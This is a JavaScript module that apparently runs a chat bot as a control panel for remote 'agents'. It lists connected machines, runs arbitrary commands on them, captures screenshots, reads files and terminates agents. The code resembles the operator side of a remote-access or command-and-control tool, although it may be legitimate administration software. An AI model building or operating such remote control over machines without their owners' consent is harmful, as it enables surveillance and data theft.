/**
 * Command Handlers using REST API Bridge
 */
import { ResponseFormatter } from './formatter.js';

export class APICommandHandlers {
  constructor(apiBridge, sock) {
    this.apiBridge = apiBridge;
    this.sock = sock;
  }

  /**
   * List connected agents
   */
  async listAgents(chatId) {
    try {
      const response = await this.apiBridge.listAgents();
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed to list agents: ${response.error}`)
        });
        return;
      }

      if (!response.agents || response.agents.length === 0) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.warning('No agents connected')
        });
        return;
      }

      let message = '*🤖 Connected Agents*\n\n';
      response.agents.forEach((agent, idx) => {
        message += `${idx + 1}. *${agent.hostname}* (${agent.id.substring(0, 8)}...)\n`;
        message += `   OS: ${agent.os} | User: ${agent.username}\n`;
        message += `   Status: ${agent.online ? '🟢 Online' : '🔴 Offline'}\n`;
        message += `   Last Seen: ${agent.last_activity}\n\n`;
      });

      await this.sock.sendMessage(chatId, { text: message });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Get agent details
   */
  async getAgentInfo(chatId, agentId) {
    try {
      const response = await this.apiBridge.getAgent(agentId);
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Agent not found: ${agentId}`)
        });
        return;
      }

      const agent = response.agent;
      const message = `*📋 Agent Details*\n\n` +
                     `ID: \`${agent.id}\`\n` +
                     `Hostname: *${agent.hostname}*\n` +
                     `OS: ${agent.os} ${agent.os_version}\n` +
                     `User: ${agent.username}@${agent.domain}\n` +
                     `Arch: ${agent.architecture}\n\n` +
                     `Status: ${agent.online ? '🟢 Online' : '🔴 Offline'}\n` +
                     `Last Seen: ${agent.last_activity}\n` +
                     `Registered: ${agent.registered_at}\n\n` +
                     `Processes: ${agent.process_count}\n` +
                     `Network: ${agent.network_interfaces} interfaces\n`;

      await this.sock.sendMessage(chatId, { text: message });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Execute command on agent
   */
  async executeCommand(chatId, agentId, command) {
    try {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.executing(`Executing: ${command}`)
      });

      const response = await this.apiBridge.executeCommand(agentId, command);
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Execution failed: ${response.error}`)
        });
        return;
      }

      // Format output
      let message = `*📤 Command Result*\n\n`;
      message += `*Command:* \`${command}\`\n\n`;
      
      if (response.output && response.output.length > 1500) {
        message += `*Output (truncated):*\n\`\`\`\n${response.output.substring(0, 1500)}...\n\`\`\``;
      } else {
        message += `*Output:*\n\`\`\`\n${response.output || '(No output)'}\n\`\`\``;
      }

      message += `\n\nStatus: ${response.success ? '✅ Success' : '❌ Failed'}`;

      await this.sock.sendMessage(chatId, { text: message });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Get system information
   */
  async getSystemInfo(chatId, agentId) {
    try {
      const response = await this.apiBridge.executeCommand(agentId, 'systeminfo');
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed: ${response.error}`)
        });
        return;
      }

      const info = response.output || 'No data';
      const truncated = info.length > 1000 ? `${info.substring(0, 1000)}...` : info;
      
      const message = `*🖥️ System Information*\n\n\`\`\`\n${truncated}\n\`\`\``;
      
      await this.sock.sendMessage(chatId, { text: message });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Get process list
   */
  async getProcessList(chatId, agentId) {
    try {
      const response = await this.apiBridge.executeCommand(agentId, 'get_process_list');
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed: ${response.error}`)
        });
        return;
      }

      const processes = response.output || 'No processes';
      const lines = processes.split('\n').slice(0, 20);
      
      const message = `*⚙️ Running Processes*\n\n\`\`\`\n${lines.join('\n')}\n...\n\`\`\``;
      
      await this.sock.sendMessage(chatId, { text: message });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Get screenshot
   */
  async getScreenshot(chatId, agentId) {
    try {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.executing('Capturing screenshot...')
      });

      const response = await this.apiBridge.getScreenshot(agentId);
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed: ${response.error}`)
        });
        return;
      }

      // Send screenshot (base64 or binary)
      if (response.image_base64) {
        const buffer = Buffer.from(response.image_base64, 'base64');
        await this.sock.sendMessage(chatId, {
          image: buffer,
          caption: '📸 Screenshot'
        });
      } else {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.warning('Screenshot not available')
        });
      }
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Get server statistics
   */
  async getServerStats(chatId) {
    try {
      const response = await this.apiBridge.getServerStats();
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed: ${response.error}`)
        });
        return;
      }

      const message = `*📊 Server Statistics*\n\n` +
                     `Uptime: ${response.uptime || 'N/A'}\n` +
                     `Connected Agents: ${response.agents || 0}\n` +
                     `Commands Executed: ${response.commands_executed || 0}\n` +
                     `Data Transferred: ${response.data_transferred || '0 B'}\n` +
                     `Active Sessions: ${response.active_sessions || 0}\n` +
                     `Alerts: ${response.alerts_count || 0}`;

      await this.sock.sendMessage(chatId, { text: message });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Get file from agent
   */
  async getFile(chatId, agentId, filePath) {
    try {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.executing(`Reading file: ${filePath}`)
      });

      const response = await this.apiBridge.getFile(agentId, filePath);
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed: ${response.error}`)
        });
        return;
      }

      const fileContent = response.content || response.data || '';
      
      if (fileContent.length > 2000) {
        const truncated = fileContent.substring(0, 2000);
        await this.sock.sendMessage(chatId, {
          text: `*📄 File: ${filePath}*\n\n\`\`\`\n${truncated}\n...\n\`\`\``
        });
      } else {
        await this.sock.sendMessage(chatId, {
          text: `*📄 File: ${filePath}*\n\n\`\`\`\n${fileContent}\n\`\`\``
        });
      }
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Get alerts
   */
  async getAlerts(chatId) {
    try {
      const response = await this.apiBridge.getAlerts();
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed: ${response.error}`)
        });
        return;
      }

      if (!response.alerts || response.alerts.length === 0) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.info('No active alerts')
        });
        return;
      }

      let message = '*🚨 Active Alerts*\n\n';
      response.alerts.slice(0, 10).forEach((alert, idx) => {
        const levelEmoji = { 'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢' };
        message += `${idx + 1}. ${levelEmoji[alert.level] || '⚪'} *${alert.level.toUpperCase()}*\n`;
        message += `   ${alert.message}\n`;
        message += `   Agent: ${alert.agent_id?.substring(0, 8)}\n`;
        message += `   Time: ${alert.created_at}\n\n`;
      });

      await this.sock.sendMessage(chatId, { text: message });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }

  /**
   * Kill agent
   */
  async killAgent(chatId, agentId) {
    try {
      const response = await this.apiBridge.killAgent(agentId);
      
      if (response.error) {
        await this.sock.sendMessage(chatId, {
          text: ResponseFormatter.error(`Failed: ${response.error}`)
        });
        return;
      }

      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.success(`Agent ${agentId.substring(0, 8)} terminated`)
      });
    } catch (error) {
      await this.sock.sendMessage(chatId, {
        text: ResponseFormatter.error(`Error: ${error.message}`)
      });
    }
  }
}
